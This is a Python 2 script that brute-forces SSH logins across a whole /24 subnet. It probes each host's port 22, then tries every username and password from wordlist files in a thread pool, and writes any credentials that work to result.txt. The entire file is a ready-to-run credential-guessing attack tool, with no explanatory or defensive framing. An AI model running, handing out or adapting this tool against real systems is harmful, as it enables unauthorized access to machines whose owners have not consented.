#encoding:utf-8
import sys
import time
import urllib2
import socket
import threadpool
from threading import *
from urlparse import urlparse, urlunparse 
from optparse import OptionParser 
from pexpect import pxssh
 
class burte_ssh():
    def __init__(self,name_list,pwd_list):
        self._name_list=name_list
        self._pwd_list=pwd_list      
            
    def check_live(self,host):
        port=22
        socket.setdefaulttimeout(1)
        s=socket.socket()
        try:
            s.connect((host,port))
            banner=s.recv(40)
            if banner:
                s.close()
                return True
            else:
                s.close()
                pass
        except:
                pass
 
    def sub_run(self,host):
        if self.check_live(host):
            down=False
            for i in self._name_list:
                for j in self._pwd_list:
                    try:
                        if(self.login_test(host,i,j)):
                            continue
                        else:
                            down=True
                            break
                    except:
                        pass
                if down:
                    break
        else:
            pass
 
    def login_test(self,host,user,password):
        targethost=host
        login_user=user
        login_pwd=password
        print targethost,login_user,login_pwd
        try:
            s=pxssh.pxssh()
            s.login(str(host),str(user),str(password),login_timeout=1)
            print "[+]succeed found %s---%s:%s"%(targethost,login_user,login_pwd)
            fs=open('result.txt','a+')
            fs.write("[+]succeed found %s---%s:%s"%(targethost,login_user,login_pwd)+'\n')
            return False
        except:
            return True
            pass
         
def main():
    usage='%prog [options] arg'
    parser=OptionParser(usage)
    parser.add_option("-H","--tgthost",dest="tgthost")
    parser.add_option("-t","--threadnum",dest="threadnum")
    (options,args)=parser.parse_args()
    if (options.tgthost==None):
        parser.error("incorrect number of arguments")
    threads=[]
    if(options.threadnum==None):
        thread_max=50
 
    else:
        thread_max=int(options.threadnum)

    host_list=[]
    i=options.tgthost.split('.')
    host=i[0]+'.'+i[1]+'.'+i[2]+'.'
    name_list=[]
    pwd_list=[]
    fn0=open('result.txt','w')
 
    fn1=open('name.txt','r')
    fn2=open('pass.txt','r')

    for i in range(1,256): 
        host_list.append(host+str(i))
 
    for line2 in fn2.readlines(): 
        pwd_list.append(line2.strip('\r\n'))

    for line1 in fn1.readlines():
        name_list.append(line1.strip('\r\n'))
 
    pool = threadpool.ThreadPool(thread_max)
    s=burte_ssh(name_list,pwd_list)
    requests = threadpool.makeRequests(s.sub_run, host_list)
    [pool.putRequest(req) for req in requests]
    pool.wait()
 
if __name__=='__main__':
    main()
